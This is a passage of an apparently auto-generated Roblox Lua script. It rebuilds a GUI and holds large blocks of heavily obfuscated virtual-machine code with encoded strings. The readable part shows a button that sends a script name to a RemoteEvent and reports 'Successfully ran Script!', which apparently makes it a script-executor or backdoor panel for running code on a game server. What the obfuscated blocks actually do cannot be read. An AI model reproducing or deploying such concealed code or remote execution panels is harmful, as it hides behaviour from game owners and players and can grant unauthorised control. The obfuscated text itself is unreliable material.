o=O[d]d=A(-441824-(-441774))h=A(-436526+436474)Q=o[d]d=O[h]h=A(1020324-1020416)q=i()o=d[h]h=O[N]N=A(-144676+144627)d=h[N]N=i()G={}h=777080+-777080 w=i()y[N]=h M={}h=213545-213543 y[w]=h h={}y[q]=M M=-185702-(-185702)S=I I=-1004414-(-1004415)V=I I=818809+-818809 K=V<I I=Z-V end else if P<7262555-671669 then m=A(-258234-(-258152))J=A(-71842+71749)P=O[J]J=P(m)J={}P=O[A(358664-358699)]else V=F(V)P=3716689-(-22561)K=F(K)c=F(c)T=F(T)C=F(C)a=F(a)z=nil end end end else if P<7163140-(-343339)then if P<-822970+8032974 then if P<60578+7104689 then if P<6456330-(-314218)then P=true P=P and-284841+1979100 or 11565632-(-532785)else y[n]=R P=y[n]P=P and-693045+704309 or-905980+8169946 end else q=A(-439784-(-439726))G=21209195176950-(-583986)M=n(q,G)w=b[M]N=x[w]w=true h=N==w P=h and-511472+10478880 or 8016405-451886 end else if P<-607091+8025922 then if P<841722+6416070 then D=383662-383660 P=886843+7613640 E=z[D]D=y[a]p=E==D B=p else P=true P=11375931-(-722486)end else b=462435-462190 n=y[v[179048-179046]]m=n*b n=-838074+15129484853443 J=m+n m=-629812+35184372718644 P=J%m n=914749-914748 y[v[245930-245928]]=P P=12459805-291753 m=y[v[608822-608819]]J=m~=n end end else if P<7523814-(-519536)then if P<57186+7949053 then if P<-7712+7613117 then P=164645+15179952 q=20593922851081-(-68066)M=A(136612+-136640)h=A(-897084+897051)w=n(M,q)N=b[w]h=Q[h]h=h(Q,o,N)else b=70946+5064571 n=A(-405422-(-405357))m=n^b J=12032592-523504 P=J-m J=A(595406-595442)m=P P=J/m J={P}P=O[A(258018-258088)]end else P=true P=P and-862139+1944540 or 10540706-59746 end else if P<7601107-(-540081)then b=A(701942+-701994)n=O[b]b=A(-229607+229515)m=n[b]b=y[v[760953-760952]]P=O[A(-125284+125223)]n={m(b)}J={L(n)}else P=693045+9354750 end end end end end else if P<-297577+11889851 then if P<9496084-(-490351)then if P<10397247-742647 then if P<-1038208+9443736 then if P<688693+7529216 then if P<692021+7501605 then P=777336+14220114 b=y[v[-555947-(-555953)]]n=b==m J=n else Z={}G=nil z=A(861371+-861418)V=i()M=nil d=nil I=i()y[I]=Z Q=nil S=u(926524-559409,{I,N,w;x})Z=i()y[Z]=S x=F(x)S={}y[V]=S K=A(-125369-(-125284))C=A(-841210+841192)p=nil S=O[K]a=y[V]T={}c={[C]=a,[z]=p}K=S(T,c)o=nil b=K S=k(14072078-(-652468),{V,I,q,N;w,Z})x=A(3936+-4005)w=F(w)M=A(-281475-(-281385))q=F(q)h=nil Z=F(Z)I=F(I)h=A(732440-732471)n=S N=F(N)T=A(-632652-(-632564))N=23163466245626-725430 V=F(V)Q=O[x]d=n(h,N)o=b[d]S=A(-771064+770974)x=A(874683+-874770)Z=-345835+16312783962691 d=A(-466888-(-466798))w=385772+7902980618708 x=Q[x]N=A(-563121+563101)x=x(Q,o)o=O[d]h=n(N,w)d=b[h]Q=o[d]w=O[M]G=A(738423+-738438)q=n(G,Z)P=774648+9605445 c=-934461+15860725447664 M=b[q]G=10128914970529-(-765240)N=w[M]q=A(-837948-(-837946))M=n(q,G)w=b[M]q=814841+22034927608112 M=A(-508464+508396)h=N[w]w=n(M,q)M=-679605+13112936009321 N=b[w]d=h[N]w=A(357405-357483)N=n(w,M)w=26887316019383-210663 h=b[N]o=d[h]N=A(-329130-(-329066))h=n(N,w)N=A(121188+-121239)d=b[h]h=O[N]I=O[S]V=n(T,c)S=b[V]Z=I[S]V=A(187622+-187675)T=1669719094631-(-397484)S=n(V,T)I=b[S]G=Z[I]V=2414918064970-(-994687)S=A(62647-62690)I=n(S,V)Z=b[I]q=G[Z]Z=A(-560316-(-560305))Z=q[Z]G={Z(q)}q={h(L(G))}N=q[-686581+686582]w=q[611701-611699]M=q[-4960+4963]end else d=A(-831352-(-831290))o=J q=A(622783-622835)J=O[d]d=A(819847-819897)P=J[d]d=i()h=A(-765944+765892)y[d]=P J=O[h]h=A(-759288+759248)P=J[h]h=P M=O[q]N=M w=P P=M and 10965487-(-655732)or 2467434-(-797177)end else if P<8232012-(-463150)then if P<9011212-402668 then P=s P=14613470-(-964094)J=B else G=A(632025-632052)P=823802+11705733 G=q[G]G=G(q)end else S=769272+-769272 I=#G Z=I==S P=Z and 915516+7279294 or 772664+1368073 end end else if P<10640422-770936 then if P<9488995-(-362411)then if P<9637916-(-91299)then d=not o b=b+x n=b<=Q n=d and n d=b>=Q d=o and d n=d or n d=-88867+10769001 P=n and d n=960958+14018060 P=P or n else h=nil P=-479791+15824388 end else S=A(525168+-525216)P=O[S]S=A(877427-877499)O[S]=P P=257512+14485978 end else if P<432173+9524696 then I=#G P=200294+1940443 S=303913-303913 Z=I==S else I=21710647559806-(-936061)Z=28674077123644-392172 G=-62882+29416055038117 q=A(285037-285097)M=n(q,G)G=A(-674952-(-674933))w=b[M]h=A(367844-367915)q=n(G,Z)Z=A(369954-369963)h=x[h]M=b[q]G=n(Z,I)Z=A(-649908+649871)I=863739+5964817000376 q=b[G]N={[w]=d;[M]=q}h=h(x,N)w=A(361195+-361220)N=O[w]G=n(Z,I)Z=21463679384919-(-954558)q=b[G]G=A(297065+-297072)M=h[q]w=N(M)q=n(G,Z)M=b[q]w=h[M]M=-116132+116332 N=w==M P=N and 9594117-(-455214)or 13185203-(-529648)end end end else if P<91747+10554992 then if P<716470+9371874 then if P<9777712-(-271400)then if P<9534483-(-512432)then B=y[n]J=B P=B and 4570027-(-618227)or 502128+15075436 else P=true P=P and 14173521-(-98915)or 988287+10422493 end else P=1021376+-438703 N=A(-168613+168558)Z=20135421167008-(-928)G=A(130212+-130254)N=x[N]q=n(G,Z)M=b[q]w=h[M]N=N(x,w)Z=A(-493167+493141)q=A(-964530-(-964478))M=O[q]I=-447150+21155507478436 G=n(Z,I)q=b[G]w=M[q]q=A(73199-73250)M=w(N)w=O[q]I={w(N)}G=I[-75808-(-75810)]Z=I[-405802-(-405805)]q=I[972799-972798]end else if P<9515582-(-891132)then if P<-897660+11167555 then Z=I T=Z P=-286441+16815842 G[Z]=T Z=nil else M,q=N(w,M)P=M and 13449083-1026560 or 7578567-388844 end else P=O[A(-969056-(-969022))]J={}end end else if P<-653236+12018528 then if P<10488956-(-852602)then if P<11535457-324970 then n=b h=-82787+82787 N=-483888-(-484143)P=y[v[-168485+168486]]d=P(h,N)m[n]=d P=9475841-(-231975)n=nil else r=M==q R=r P=995647+5852050 end else J={}P=true y[v[721078+-721077]]=P P=O[A(15136+-15203)]end else if P<-768376+12162921 then Q=nil P=15660607-506992 o=nil d=nil else P=O[A(-22817+22804)]J={}end end end end else if P<14250031-(-491375)then if P<-799993+14571536 then if P<12305234-(-107939)then if P<-348459+12496735 then if P<12053372-211431 then G=A(340971+-341023)q=O[G]G=A(-579890+579806)M=q[G]N=M P=3644367-379756 else P=u(8873968-726775,{Q})r={P()}P=O[A(-503728+503705)]J={L(r)}end else n=y[v[785208+-785205]]P=14931432-(-377836)b=336319-336170 m=n*b n=-659700+659957 J=m%n y[v[-304425+304428]]=J end else if P<13071722-(-403693)then if P<12586136-78178 then S=A(315233-315306)G=A(766264+-766286)h=M G=q[G]V=8608+25652475018162 I=n(S,V)Z=b[I]G=G(q,Z)P=G and 8881008-210023 or-974206+13503741 else q=nil P=-8928+10389021 h=nil end else Z=26889463650875-292969 G=A(671484-671541)q=n(G,Z)M=b[q]w=h[M]M=-549444-(-549873)N=w==M P=N and 5781968-659252 or-636468+1225798 end end else if P<14204811-(-363307)then if P<332458+14215111 then if P<-395692+14663747 then Y=A(810553+-810591)V=A(965430-965502)P=O[Y]S=O[V]Y=P(S)P=A(766520+-766568)O[P]=Y P=13907080-(-836410)else J=A(-1036224+1036176)m=A(475247+-475319)P=O[J]J=O[m]m=A(-83051-(-82979))O[m]=P m=A(611571+-611619)O[m]=J P=-108515+10156310 m=y[v[-405932-(-405933)]]n=m()end else o=y[x]J=o P=7689226-(-665845)end else if P<15613018-890556 then G=not q w=w+M h=w<=N h=G and h G=w>=N G=q and G h=G or h G=328170+3362950 P=h and G h=10921262-(-462382)P=P or h else n=t[586740-586738]m=t[830459-830458]P=y[v[-428140-(-428141)]]b=P P=b[n]P=P and-594482+3072125 or 1436044-375148 end end end else if P<15862017-544369 then if P<15919125-900028 then if P<14561262-(-425709)then if P<15915783-1018240 then P=676789+7361856 else P=y[v[-53538+53548]]n=y[v[228263+-228252]]m[P]=n P=y[v[725046+-725034]]n={P(m)}P=O[A(-128368-(-128356))]J={L(n)}end else P=16663133-478319 y[v[598835+-598830]]=J m=nil end else if P<418989+14875596 then if P<15976022-846074 then w=A(487515-487599)P=3167808-(-759864)N=O[w]J=N else P=O[A(-83107+83051)]J={n}end else b=755512-755511 n=y[v[-478383+478386]]m=n~=b P=m and 6217886-911868 or-743927+12911979 end end else if P<15438874-(-791033)then if P<15713057-(-470831)then if P<16522448-1035904 then n=nil x=nil Q=nil d=nil J={}b=nil o=nil P=O[A(1041648-1041664)]else y[n]=J P=6255390-(-379820)end else P=y[v[-188006+188013]]P=P and-219623-(-564209)or 247656+1554639 end else if P<-497007+17200418 then I=I+V T=not K Z=I<=S Z=T and Z T=I>=S T=K and T Z=T or Z T=10418206-304361 P=Z and T Z=-354155+10225816 P=P or Z else M=nil w=A(-713142+713109)w=Q[w]P=9743754-(-75682)I=-911292+22146601891917 Z=A(-639540+639511)G=n(Z,I)q=b[G]N=nil w=w(Q,o,q)end end end end end end end P=#W return L(J)end,function(O,A)local L=b(A)local t=function(t,v,W,j)return P(O,{t;v,W,j},A,L)end return t end,{},function()n=(-869499+869500)+n m[n]=363052-363051 return n end,function(O)m[O]=m[O]-(467567-467566)if m[O]==-385708-(-385708)then m[O],y[O]=nil,nil end end return(x(99235+3942616,{}))(L(J))end)(getfenv and getfenv()or _ENV,unpack or table[A(798073+-798157)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
end))
Script139.Disabled = true
TextButton140.Name = "Template"
TextButton140.Parent = Script139
TextButton140.Size = UDim2.new(0, 429, 0, 35)
TextButton140.BackgroundColor = BrickColor.new("Black")
TextButton140.BackgroundColor3 = Color3.new(0.168627, 0.168627, 0.168627)
TextButton140.BackgroundTransparency = 0.949999988079071
TextButton140.BorderColor = BrickColor.new("Really black")
TextButton140.BorderColor3 = Color3.new(0, 0, 0)
TextButton140.BorderSizePixel = 0
TextButton140.ZIndex = 12
TextButton140.Font = Enum.Font.Unknown
TextButton140.FontSize = Enum.FontSize.Size18
TextButton140.Text = "Script.txt"
TextButton140.TextColor = BrickColor.new("Institutional white")
TextButton140.TextColor3 = Color3.new(1, 1, 1)
TextButton140.TextSize = 16
LocalScript141.Parent = TextButton140
LocalScript141.Enabled = false
table.insert(cors,sandbox(LocalScript141,function()
local button = script.Parent
local Notification = require(script.Parent.Parent.Parent.Parent.Notif)
local remote = script.Parent.Parent.Parent.RemoteEvent
button.MouseButton1Click:Connect(function()
    remote:FireServer(button.Name)
    Notification:PushNotification("Successfully ran Script!")
end)
end))
LocalScript141.Disabled = true
RemoteEvent142.Parent = Script139
LocalScript143.Parent = Script139
table.insert(cors,sandbox(LocalScript143,function()
local Notification = require(script.Parent.Parent.Notif)
local RemoteEvent = script.Parent.RemoteEvent
RemoteEvent.OnClientEvent:Connect(function(Message)
    Notification:PushNotification(Message)
end)
end))
Script144.Name = "Loading"
Script144.Parent = Frame1
table.insert(cors,sandbox(Script144,function()
return(function(...)local c={"\102\077\057\069\102\070\050\116\113\076\097\061","\075\111\047\071\082\114\099\061";"\089\080\099\082\088\050\080\080\090\115\106\071\107\122\043\089";"\088\089\106\083\048\066\072\061";"\111\081\047\122\106\074\047\070\051\115\071\051\088\081\083\068\050\087\061\061","\086\121\088\115\048\050\088\115\065\122\106\100\065\118\054\081","\043\121\077\083\043\053\061\061";"\043\089\083\067\118\051\061\061";"\106\121\088\115\051\121\100\083\048\068\106\056\104\050\082\061","\117\068\054\078\055\070\102\083\089\085\119\100\068\074\097\061","\109\048\055\047\054\072\121\121","\122\080\098\052\104\122\106\100\043\068\077\119\048\068\089\061";"\068\112\119\101\085\087\061\061";"\086\079\077\067\068\097\061\061";"\043\057\102\067\099\102\087\113";"\086\122\111\116\086\075\047\083\084\116\043\085\079\121\054\107\111\087\061\061","\079\070\051\071\051\080\043\083\051\075\104\109\050\118\081\109","\089\109\099\087\089\051\065\073\072\053\061\061","\111\121\111\057\104\122\104\082\111\088\081\099\104\081\072\061";"\055\065\081\074\115\053\085\076\085\053\061\061";"\065\078\081\115\104\051\061\061";"\112\089\102\072\074\116\117\053\048\085\098\077\086\119\051\065\057\098\099\050\081\084\081\084\116\097\061\061";"\043\068\077\119\048\068\089\061","\085\104\073\072\049\055\079\111\049\097\061\061","\065\121\100\100\086\087\061\061";"\114\105\073\105\088\068\105\072\103\052\082\061";"\102\087\107\122\043\111\106\088\081\069\085\053\104\085\076\043\065\111\119\069\080\053\061\061","\075\079\117\084\051\099\053\119\057\116\048\106\111\104\090\061";"\102\054\119\115\043\056\047\078","\048\099\071\079\086\122\083\111\086\075\102\051\090\081\053\121";"\084\068\043\097\107\118\104\066\120\088\081\051\086\121\100\070","\122\080\098\083\048\118\106\081\084\053\061\061","\043\068\098\075\043\070\047\083\048\118\086\061";"\090\110\073\099","\109\080\055\073\085\053\061\061";"\106\121\088\115\089\118\077\049\079\115\081\049\106\113\047\105\043\122\053\061";"\087\105\116\089\067\122\051\061","\098\066\047\081\100\105\050\076\076\051\061\061";"\087\077\075\114";"\049\048\112\077\056\088\087\061","\043\073\111\074\065\113\088\069\090\089\106\097\051\078\102\068";"\086\118\077\049\104\068\098\052";"\086\121\111\056\079\122\102\115","\043\048\110\119\054\051\043\089\073\085\104\105";"\105\086\109\047\086\103\099\109";"\069\071\113\088\057\117\076\086";"\117\067\052\075";"\086\099\104\054\107\066\106\050\089\118\106\109\089\113\106\099\048\051\061\061","\122\080\098\078\065\097\061\061";"\108\117\101\075\079\071\072\061","\048\050\106\088\111\066\047\051\088\074\098\075\107\050\077\104\086\121\087\061";"\048\073\099\061","\085\118\101\090\078\085\097\110\090\089\065\108\052\087\055\050\079\069\117\112","\106\068\088\075\043\070\047\105\084\051\061\061";"\086\068\077\083\086\078\090\061","\121\085\097\117\047\051\061\061","\100\084\049\066\055\051\061\061","\099\071\056\112\049\048\070\117";"\049\070\105\075\085\081\106\114\103\087\061\061";"\120\084\100\065\116\107\116\090\103\082\101\090\107\065\053\076\116\099\102\090";"\104\113\111\080\065\087\061\061","\088\070\043\081\104\050\071\066\079\122\083\081","\083\051\107\073\121\085\072\072","\103\083\051\112";"\111\090\115\120\075\112\075\082\120\100\110\043\115\079\074\061","\048\050\077\115\079\053\061\061";"","\043\068\098\049\043\050\080\119\104\122\072\061";"\098\080\083\083\084\067\104\055\086\087\061\061","\121\098\099\084\115\116\070\118";"\099\079\119\054\070\082\086\057","\079\109\043\084\088\097\061\061","\088\068\077\052\086\068\088\056\072\099\106\081\043\068\088\116\043\068\088\074\072\051\061\061","\065\074\104\065\107\122\106\112\066\089\047\056\088\115\081\103\106\053\061\061";"\104\070\087\082\065\080\065\097\079\115\052\113\048\118\083\055\084\073\089\061","\054\112\110\098\108\101\051\061";"\075\107\078\112\116\083\073\089\065\122\112\050\057\102\076\061";"\113\051\115\114\112\081\076\110","\089\085\099\076\051\055\104\106\120\081\073\122\083\081\070\057\110\056\075\120\103\101\077\105","\088\070\053\071\065\078\088\118\089\116\106\051\090\050\104\104\088\087\061\061","\119\073\056\048\107\051\061\061";"\077\107\084\097\057\122\112\072\101\054\106\112\086\118\082\089\082\057\053\061","\079\076\111\043\110\071\072\043\070\056\072\054\085\100\080\108\109\111\081\122\108\087\061\061","\043\048\081\118\051\089\083\117\118\087\061\061","\117\089\051\052\116\079\050\056","\104\077\048\115\081\087\061\061";"\122\080\098\109\104\050\082\061";"\065\047\106\089";"\079\047\108\048\111\109\066\099\116\097\061\061","\086\113\106\056\079\050\071\078";"\121\070\055\043\047\107\043\119","\076\072\068\073\055\043\054\100\119\088\074\079\047\100\076\067\084\051\083\102","\114\117\047\106\069\054\101\090\104\097\061\061","\050\069\051\068\090\047\053\043\052\049\113\049\098\100\120\088\050\066\074\061","\051\049\081\111\055\056\075\072\049\115\105\118\080\087\061\061";"\105\050\055\114\074\087\070\071\104\057\053\111\089\087\087\061","\073\082\057\118\080\053\061\061","\106\118\081\049\104\099\104\083\086\078\111\115\051\121\100\083\048\068\051\061";"\122\112\115\112\051\115\052\122\078\053\061\061","\068\089\049\112\068\097\081\077\077\072\110\068\078\102\111\083\083\103\074\061";"\048\068\088\049";"\086\071\122\116\106\097\061\061","\105\077\099\120\101\047\072\101\074\053\061\061","\057\070\057\043\072\054\107\077","\086\118\088\052\048\113\104\081";"\083\084\065\061","\079\050\088\079\048\068\099\056\048\068\080\089\066\068\077\078","\047\122\048\102\067\122\102\090\075\078\073\077\054\089\070\111\083\051\109\054\118\051\061\061","\043\050\071\097\065\050\111\067","\100\099\081\081","\104\056\103\068\053\088\072\079\072\108\073\098\079\051\061\061","\087\100\098\101\101\068\048\108\115\097\061\061";"\104\121\080\100\043\068\111\069","\086\101\104\119\049\101\108\117\048\051\061\061";"\106\050\071\080\048\051\061\061","\056\120\053\061","\072\111\114\070\080\103\076\083\066\067\115\050\098\087\089\050\067\099\077\079";"\120\119\087\081\104\057\069\083\120\087\061\061";"\070\108\069\113\117\053\061\061","\120\087\061\061";"\053\055\118\085\115\053\061\061";"\120\076\067\088\089\116\120\113\087\101\113\082\087\108\090\061";"\086\068\111\100\048\068\097\061","\097\048\089\106\106\114\118\056";"\107\122\111\102","\075\117\082\120\071\120\081\049\076\051\061\061","\075\120\114\117\119\056\122\114\099\081\075\049\052\105\102\067\079\087\119\047\087\072\105\114\073\113\086\061";"\114\069\049\085\109\073\120\048";"\048\099\067\118\104\079\113\087","\106\069\090\089\103\090\116\112","\065\075\104\081\106\118\088\051","\104\118\054\105\048\113\072\061","\104\122\047\056\048\113\072\061","\048\043\086\061";"\118\075\048\097";"\089\079\081\104\072\078\118\107","\099\065\120\106\052\079\065\061","\115\097\051\051\110\112\077\056\107\053\061\061";"\048\073\072\061","\079\121\048\086\069\120\054\106\113\087\061\061","\104\121\077\052\104\051\061\061";"\065\121\098\049\065\121\077\115"}for I,x in ipairs({{-383148+383149,-802731-(-802873)};{359468-359467;-943398-(-943485)};{-571506+571594,385018-384876}})do while x[-90659+90660]<x[200104-200102]do c[x[-1048576+1048577]],c[x[725432-725430]],x[-227495+227496],x[401710-401708]=c[x[103523+-103521]],c[x[595250+-595249]],x[-308650+308651]+(980607-980606),x[-1001983+1001985]-(-205926+205927)end end local function I(I)return c[I+(-271934-(-293865))]end do local I=string.len local x=c local o=string.sub local T=math.floor local V={y=454372-454318,v=-342955+342993,["\048"]=907031-907004,U=-768824+768834,u=32799-32737,O=433133+-433107,G=759480+-759423,f=-324841-(-324842),j=-402907-(-402924),g=391607-391596;["\043"]=-871390-(-871419);["\054"]=-341419+341468;K=-828487-(-828538);B=551729+-551710,W=397484+-397452;V=198146-198118,["\053"]=972606-972606;m=-995583+995627;r=-433965+433996,q=522471-522416;["\052"]=-219239+219284;["\049"]=943933+-943887,["\051"]=-390188+390204,["\056"]=-209190+209240,E=759520-759480,o=686197+-686184;Z=-829934-(-829946),I=61154+-61151;["\057"]=36835-36833,t=752730-752695;L=-335850+335910,J=610839-610803;w=730871+-730837;["\050"]=-73164-(-73186),x=160371-160357;Y=-70370+70390,k=-267176+267194;D=679861+-679855,h=-255400+255425,A=-316650+316674,a=-945597+945645,p=-667003-(-667061),c=891008-891004;i=-297850-(-297897),Q=123593-123556,e=962558+-962495,P=7136+-7083,H=-735151-(-735159);d=-818840-(-818873);N=-653325-(-653364),b=610483+-610422,l=26273+-26258,s=886063-886011,z=-388117-(-388140),M=-345259+345264;["\047"]=690174-690165,C=-927570-(-927613);F=809529+-809522;R=-759864+759920;["\055"]=-252200+252242;S=488175+-488134,n=-697270+697329,X=517296+-517275,T=579954+-579924}local U=table.concat local L=string.char local O=type local r=table.insert for c=612852-612851,#x,-599474-(-599475)do local s=x[c]if O(s)=="\115\116\114\105\110\103"then local O=I(s)local q={}local R=561329+-561328 local F=-411309-(-411309)local B=-34593-(-34593)while R<=O do local c=o(s,R,R)local I=V[c]if I then F=F+I*(-155109+155173)^((-640945-(-640948))-B)B=B+(-107170-(-107171))if B==-637876+637880 then B=-790072+790072 local c=T(F/(542-(-64994)))local I=T((F%(-138534-(-204070)))/(-380908+381164))local x=F%(-694326+694582)r(q,L(c,I,x))F=371756-371756 end elseif c=="\061"then r(q,L(T(F/(656820+-591284))))if R>=O or o(s,R+(783352+-783351),R+(-687157+687158))~="\061"then r(q,L(T((F%(661554-596018))/(150181-149925))))end break end R=R+(-876730-(-876731))end x[c]=U(q)end end end return(function(c,o,T,V,U,L,O,E,e,x,w,P,b,m,F,s,R,K,W,r,q,B)R,W,E,e,m,B,s,r,P,q,w,b,F,K,x=-411501+411501,function(c,I)local o=F(I)local T=function(T,V,U,L,O)return x(c,{T;V,U;L,O},I,o)end return T end,function(c,I)local o=F(I)local T=function(T,V,U,L)return x(c,{T;V,U;L},I,o)end return T end,function(c,I)local o=F(I)local T=function(T,V,U)return x(c,{T;V,U},I,o)end return T end,function(c)s[c]=s[c]-(-382379-(-382380))if 865339-865339==s[c]then s[c],r[c]=nil,nil end end,function(c)local I,x=33058-33057,c[-521263-(-521264)]while x do s[x],I=s[x]-(-199653-(-199654)),I+(234600-234599)if s[x]==1038784+-1038784 then s[x],r[x]=nil,nil end x=c[I]end end,{},{},function(c,I)local o=F(I)local T=function(T)return x(c,{T},I,o)end return T end,function()R=(-309097-(-309098))+R s[R]=144164+-144163 return R end,function(c,I)local o=F(I)local T=function()return x(c,{},I,o)end return T end,function(c,I)local o=F(I)local T=function(...)return x(c,{...},I,o)end return T end,function(c)for I=122085-122084,#c,811577+-811576 do s[c[I]]=s[c[I]]+(-147749+147750)end if T then local x=T(true)local o=U(x)o[I(-648116+626304)],o[I(-29793+7998)],o[I(936499-958398)]=c,B,function()return-289449+291113 end return x else return V({},{[I(-973472-(-951677))]=B;[I(-744439+722627)]=c,[I(-150447-(-128548))]=function()return 895612+-893948 end})end end,function(c,I)local o=F(I)local T=function(T,V,U,L,O,r)return x(c,{T,V;U,L,O,r},I,o)end return T end,function(x,T,V,U)local G,Y,M,n,b,s,C,k,Z,i,A,X,B,y,t,S,z,F,a,d,f,N,p,D,Q,v,l,R,H,h,O,g,u,J while x do if x<8516944-662389 then if x<4776634-407533 then if x<1850829-(-65890)then if x<2038929-918780 then if x<1527563-1018688 then if x<196518+275814 then if x<100387+199245 then O=I(-622602-(-600755))s=I(-974334+952542)x=c[O]O=c[s]s=I(568978-590770)c[s]=x x=12540511-(-659252)s=I(-194918+173071)c[s]=O s=r[V[-367978-(-367979)]]R=s()else G=r[b]O=G x=-174693+13747204 end else C=I(-251432+229512)a=q()r[a]=Y Z=-565262-(-565362)D=173604-173349 O=c[C]C=I(951380-973182)z=-852472-(-852474)x=O[C]C=-838906+838907 O=x(C,Z)C=q()r[C]=O Z=-191206-(-191206)x=r[p]O=x(Z,D)t=859643+-859642 Z=q()r[Z]=O D=-255720+255721 x=r[p]J=500208+-500208 f=r[C]O=x(D,f)D=q()r[D]=O O=r[p]f=O(t,z)M=402940-392940 z=I(782479-804345)O=-402796+402797 x=f==O f=q()h=I(529918-551729)O=I(-365739+343871)r[f]=x x=I(-87239-(-65314))Q=c[h]N=r[p]x=A[x]l={N(J,M)}h=Q(o(l))Q=I(-284882-(-263016))n=h..Q t=z..n z=I(587852-609715)x=x(A,O,t)t=q()n=W(2807989-(-586162),{p,a;g,F,R,v,f;t,C;D;Z,y})r[t]=x O=c[z]z={O(n)}x={o(z)}z=x x=r[f]x=x and 9257594-(-27297)or 11033329-1952 end else if x<58913-(-853754)then if x<754423+37931 then g=g+i d=g<=y k=not X d=k and d k=g>=y k=X and k d=k or d k=-985023+7562376 x=d and k d=13126129-(-354219)x=x or d else x=r[p]u=-356843+356849 S=-75810+75811 H=x(S,u)u=I(-1007318-(-985471))x=I(925350-947197)c[x]=H S=c[u]u=-216935+216937 x=S>u x=x and-889340+12763495 or 9937295-290409 end else X=421165+24773053213938 i=I(840122-862011)a=I(-12424-9376)v=33481364967898-(-616435)g=F(i,X)y=R[g]k=I(-604949-(-583090))X=F(k,v)v=I(-258664+236853)i=R[X]Z=14182414878906-54562 k=c[v]v=k(p)u=F(a,Z)k=R[u]X=v..k D=I(-762168+740242)g=i..X B[y]=g i=-173797+173798.5 g=I(81878-103715)u=-515440+27229850419327 X=-210407+34127778099726 y=c[g]g=y(i)k=-89123+17414476438397 i=I(-983143-(-961214))g=F(i,X)Z=-879547+586281807325 y=R[g]X=I(991419-1013311)i=F(X,k)v=I(-7809-14048)g=R[i]B[y]=g g=I(383136-404973)X=I(-850746+828945)i=-910012+910013 y=c[g]g=y(i)i=c[X]f=11344428183193-(-391852)k=F(v,u)X=R[k]p=nil v=505520+9950668647811 k=I(-260017-(-238183))x=12688227-(-642612)g=i[X]X=F(k,v)i=R[X]y=g[i]v=-360811+28430330259672 k=-376684+17438099767004 X=I(-766346-(-744503))i=F(X,k)g=R[i]i=true y[g]=i k=I(-555889+533961)i=I(-13129-8672)g=c[i]X=F(k,v)i=R[X]y=g[i]v=-366571+356493531447 k=I(918013-939837)a=I(-218369-(-196518))X=F(k,v)i=R[X]v=-138020+17965322853503 k=I(-707446+685574)g=y[i]X=F(k,v)v=21607565421349-(-713590)i=R[X]X=false b[i]=X k=I(-779099-(-757239))X=F(k,v)i=R[X]X=false G[i]=X k=I(1009727+-1031553)v=7487430092121-(-144868)X=F(k,v)i=R[X]X=false v=I(681958-703798)B[i]=X X=I(-914441-(-892604))i=c[X]k=-918588+918589 X=i(k)k=c[v]t=29072446166150-(-939325)u=F(a,Z)v=R[u]X=k[v]a=-954046+954046 v=981630+-981630 u=488751+-488751 Z=820857+-820857 k=X(v,u,a,Z)a=I(-1037806-(-1015935))u=c[a]Z=F(D,f)a=R[Z]D=7108388396878-591218 v=u[a]Z=I(-535921+514041)a=F(Z,D)u=R[a]X=v[u]Z=I(-221927+200056)f=I(-1038080+1016264)a=c[Z]D=F(f,t)Z=R[D]D=I(520752+-542601)u=a[Z]i=I(-631767-(-609843))f=24732249721098-(-479471)Z=F(D,f)a=R[Z]v=u[a]D=I(-422066-(-400172))u=388652+-388651 i=y[i]i=i(y,k,X,v,u)v=I(103587+-125427)Z=556593+24954520984727 a=I(-397356+375434)i=I(-323690+301766)k=c[v]u=F(a,Z)a=-264936-(-264936)v=R[u]X=k[v]v=57122+-57122 t=1896286924389-993151 u=-881275-(-881275)f=-120036+22119756735836 Z=285161+-285161 k=X(v,u,a,Z)a=I(407405+-429276)i=g[i]u=c[a]Z=F(D,f)D=199078+476755720214 a=R[Z]Z=I(-253480+231610)v=u[a]a=F(Z,D)Z=I(591300-613171)f=I(857787+-879651)u=R[a]X=v[u]a=c[Z]D=F(f,t)f=-858171+34282402288882 Z=R[D]D=I(-489822-(-468015))u=a[Z]Z=F(D,f)a=R[Z]v=u[a]u=-592690+592691 i=i(g,k,X,v,u)v=I(-273128+251288)k=112803+-112801 X=I(750443-772280)i=c[X]a=I(-446446+424548)Z=-18593+24958816658285 D=I(-42062-(-20193))X=i(k)i=I(824406-846330)k=c[v]u=F(a,Z)v=R[u]f=22989513900222-(-135908)u=370292-369835 a=800057-800057 X=k[v]Z=837690-837434 v=-306025-(-306025)k=X(v,u,a,Z)a=I(-1012270-(-990399))t=290601+13036697043012 u=c[a]Z=F(D,f)a=R[Z]v=u[a]D=865531+33758398563796 Z=I(-992959+971154)a=F(Z,D)f=I(-339820-(-317930))u=R[a]X=v[u]Z=I(-329322+307451)a=c[Z]D=F(f,t)Z=R[D]u=a[Z]D=I(-6304+-15538)i=y[i]f=14724671241593-247784 Z=F(D,f)a=R[Z]v=u[a]D=I(714998+-736789)u=104484-104483 i=i(y,k,X,v,u)a=I(-31636-(-9760))Z=551217+4357376747177 v=I(-188838+166998)k=c[v]u=F(a,Z)v=R[u]u=-130852+131309 X=k[v]Z=688693-688437 f=31010609767137-(-478703)v=994367+-994367 a=-871419-(-871419)k=X(v,u,a,Z)a=I(884045-905916)u=c[a]Z=F(D,f)D=623987+7878283564854 a=R[Z]Z=I(407597+-429394)v=u[a]t=-727351+5048888863637 a=F(Z,D)f=I(-1042368+1020447)i=I(-53573-(-31649))u=R[a]Z=I(28659-50530)X=v[u]a=c[Z]D=F(f,t)Z=R[D]D=I(-514577-(-492783))f=23415802981276-431725 i=g[i]u=a[Z]Z=F(D,f)a=R[Z]v=u[a]u=-757750-(-757751)i=i(g,k,X,v,u)D=1024512+15837100447645 v=13707807177364-723126 k=I(-22072-(-224))u=I(924029+-945830)y=nil X=F(k,v)i=R[X]X=true G[i]=X v=c[u]Z=I(205414+-227264)a=F(Z,D)u=R[a]Z=456430+26782085442176 a=I(-542513+520646)k=v[u]u=F(a,Z)a=-531568+9757390258159 v=R[u]X=k[v]u=I(613092-634996)v=F(u,a)k=R[v]v=I(-547697+525851)i=X[k]u=-593138+3481177823644 k=F(v,u)X=R[k]Z=I(-33083-(-11168))u=I(807121-828922)k=true i[X]=k v=c[u]D=30582173634832-(-548401)a=F(Z,D)u=R[a]Z=11171550376821-(-488751)k=v[u]a=I(537649+-559514)u=F(a,Z)v=R[u]X=k[v]u=I(556081+-577964)a=28231681728536-129380 v=F(u,a)k=R[v]v=I(-737271+715344)i=X[k]u=1314301068806-966974 D=870267+7951299990898 